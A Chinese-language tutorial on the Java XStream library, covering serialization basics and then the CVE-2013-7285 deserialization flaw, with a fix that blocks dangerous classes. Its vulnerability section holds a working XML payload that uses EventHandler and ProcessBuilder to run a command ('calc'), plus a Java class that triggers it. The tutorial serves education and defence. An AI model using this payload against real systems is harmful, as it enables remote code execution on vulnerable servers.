## XStream 简介

XStream 是一个 Java 库，能让你轻松地在 Java 对象和 XML 数据之间互相转换。你可以把 Java 对象存成 XML 文件，也能把 XML 文件转换回 Java 对象。

### XStream 的简单用法

1.  **序列化 (Java 对象转 XML)**

```java
import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.io.xml.DomDriver;

public class Serialize {
    public static void main(String[] args) {
        Person p = new Person();
        p.age = 30;
        p.name = "张三";

        XStream xstream = new XStream(new DomDriver());
        String xml = xstream.toXML(p);
        System.out.println(xml); // 输出 XML 字符串
    }
}

class Person {
    String name;
    int age;
}
```

这段代码会把一个 `Person` 类的对象转换成 XML 格式的字符串。

2.  **反序列化 (XML 转 Java 对象)**

```java
import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.io.xml.DomDriver;

public class Deserialize {
    public static void main(String[] args) {
        String xml = "<com.example.Person>\n" +
                "  <name>张三</name>\n" +
                "  <age>30</age>\n" +
                "</com.example.Person>";

        XStream xstream = new XStream(new DomDriver());
        Person p = (Person) xstream.fromXML(xml);

        System.out.println(p.name); // 输出：张三
        System.out.println(p.age);  // 输出：30
    }
}

class Person {
    String name;
    int age;
}
```

这段代码会把 XML 字符串转换成一个 `Person` 类的对象。

## XStream 的核心概念

XStream 主要由以下几个部分组成：

1.  **Mapper（映射器）**： 负责找到 XML 标签对应的 Java 类、成员变量等。

2.  **Converter（转换器）**： 负责将 XML 中的数据转换成 Java 对象，或者将 Java 对象转换成 XML。XStream 已经为很多常见的 Java 类型提供了默认的转换器。

3.  **MarshallingStrategy（编组策略）：** 决定了序列化和反序列化的过程。

## XStream 反序列化漏洞 (以 CVE-2013-7285 为例)

这个漏洞的核心在于 XStream 的 `DynamicProxyConverter` 和 `EventHandler` 类。

1.  **DynamicProxyConverter**： 允许 XStream 将 XML 内容转换成动态代理对象。

2.  **EventHandler**： 允许程序通过反射调用任意方法。

攻击者可以构造特殊的 XML，利用 `DynamicProxyConverter` 创建一个动态代理对象，并使用 `EventHandler` 调用任意 Java 方法，从而执行恶意代码。

### 漏洞原理

简单来说，就是攻击者通过精心构造的 XML，让 XStream 在反序列化的时候，执行了攻击者想要执行的命令。

### 例子

```xml
<sorted-set>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command>
          <string>calc</string>  <!--  在windows上会弹出计算器，在Linux上无效 -->
        </command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>
```

这段 XML 代码会：

*   创建一个动态代理对象，代理 `java.lang.Comparable` 接口。
*   当调用 `Comparable` 接口的方法时，会执行 `java.beans.EventHandler` 中的代码。
*   `EventHandler` 会创建一个 `ProcessBuilder` 对象，执行 `calc` 命令（打开计算器）。

### 漏洞利用步骤

1.  攻击者构造包含恶意 XML 的请求。
2.  程序使用 XStream 反序列化这个 XML。
3.  XStream 创建动态代理对象，并调用 `EventHandler`。
4.  `EventHandler` 执行 `calc` 命令，导致恶意代码执行。

### 代码示例

```java
import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.io.xml.DomDriver;

import java.io.FileInputStream;

public class Exploit {
    public static void main(String[] args) throws Exception {
        String xml = "<sorted-set>\n" +
                "  <dynamic-proxy>\n" +
                "    <interface>java.lang.Comparable</interface>\n" +
                "    <handler class=\"java.beans.EventHandler\">\n" +
                "      <target class=\"java.lang.ProcessBuilder\">\n" +
                "        <command>\n" +
                "          <string>calc</string>\n" +
                "        </command>\n" +
                "      </target>\n" +
                "      <action>start</action>\n" +
                "    </handler>\n" +
                "  </dynamic-proxy>\n" +
                "</sorted-set>";

        XStream xStream = new XStream(new DomDriver());
        xStream.fromXML(xml); // 执行反序列化，触发漏洞
    }
}
```

**注意：运行这段代码会执行系统命令，请在虚拟机或沙箱环境中运行！**

### 修复方案

官方的修复方法是增加黑名单，禁止 XStream 反序列化 `java.beans.EventHandler` 和 `java.lang.ProcessBuilder` 等危险类。

```java
xstream.registerConverter(new Converter() {
    public boolean canConvert(Class type) {
        return type != null && (type == java.beans.EventHandler.class || type == java.lang.ProcessBuilder.class || Proxy.isProxy(type));
    }

    public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {
        throw new ConversionException("Unsupported type due to security reasons.");
    }

    public void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context) {
        throw new ConversionException("Unsupported type due to security reasons.");
    }
}, XStream.PRIORITY_LOW);
```

这段代码会注册一个转换器，禁止 XStream 反序列化 `EventHandler`、`ProcessBuilder` 和动态代理对象，从而防止漏洞利用。

## 总结

XStream 是一个方便的 XML 序列化/反序列化库，但如果不小心使用，可能会导致安全漏洞。理解 XStream 的工作原理和漏洞原理，可以帮助你更好地使用 XStream，避免安全风险。